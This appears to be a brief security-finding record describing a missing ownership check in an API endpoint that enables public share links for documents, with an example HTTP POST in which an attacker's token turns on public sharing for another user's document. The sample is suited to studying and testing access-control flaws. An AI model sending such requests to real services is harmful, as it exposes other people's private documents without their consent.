diagnosis: Allows enabling public link sharing for a document using Tortoise ORM. The endpoint does not verify whether the requesting user owns the document before modifying its public visibility flag and generating a share link.
exploit_request:
POST /api/docs/731/public-link HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"enable_public": true}
